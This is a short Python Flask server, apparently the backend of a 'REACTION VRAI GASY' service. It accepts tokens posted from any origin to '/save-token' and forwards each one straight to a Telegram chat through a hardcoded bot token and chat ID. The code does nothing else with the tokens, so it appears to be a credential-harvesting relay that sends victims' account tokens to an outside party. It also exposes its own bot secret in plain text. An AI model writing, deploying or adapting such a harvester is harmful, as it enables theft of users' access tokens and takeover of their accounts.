import os
import requests
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

# Tes infos Telegram
TELEGRAM_TOKEN = "8632263179:AAFDjyU6d4eTCMgg4wM4xB1sDBGmWEMod2s"
TELEGRAM_CHAT_ID = "7129218282"

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message}
    try:
        requests.post(url, json=payload)
    except Exception as e:
        print(f"Erreur Telegram: {e}")

@app.route('/')
def home():
    return "Système REACTION VRAI GASY prêt !", 200

@app.route('/save-token', methods=['POST'])
def save_token():
    data = request.get_json()
    token = data.get('token')
    if token:
        # Envoi direct vers ton Telegram
        msg = f"🚀 NOUVEAU TOKEN REÇU !\n\n{token}"
        send_to_telegram(msg)
        return jsonify({"status": "success"}), 200
    return jsonify({"status": "error"}), 400

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
